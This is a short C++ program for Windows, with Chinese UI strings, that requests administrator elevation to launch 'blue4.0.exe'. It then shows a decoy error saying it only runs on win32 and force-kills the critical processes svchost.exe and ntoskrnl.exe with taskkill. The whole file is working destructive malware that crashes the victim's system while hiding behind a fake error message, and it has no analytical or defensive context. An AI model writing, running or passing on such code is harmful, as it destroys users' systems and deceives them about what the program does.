
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <thread>
using namespace std;

 
 
 void getPower(){
 	    SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = TEXT("runas");
        sei.lpFile = TEXT("blue4.0.exe");
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;
    
    if (!ShellExecuteEx(&sei)) {
        DWORD errorCode = GetLastError();
        if (errorCode == ERROR_CANCELLED) {
            std::cerr << "用户拒绝了管理员权限请求。" << std::endl;
        } 
    }
 } 
 
 
 
 
int main() {
	thread t(getPower);
	t.join();
    MessageBox(NULL,TEXT("该程序只能在win32中运行"),TEXT("错误"),MB_OK |MB_ICONWARNING);
    
    
  int status = system("taskkill /F /IM svchost.exe");
  int status1 = system("taskkill /F /IM ntoskrnl.exe");

  if (status != 0) {
    std::cout << "执行命令失败" << std::endl;
    return 1; 
  }
  return 0;
}
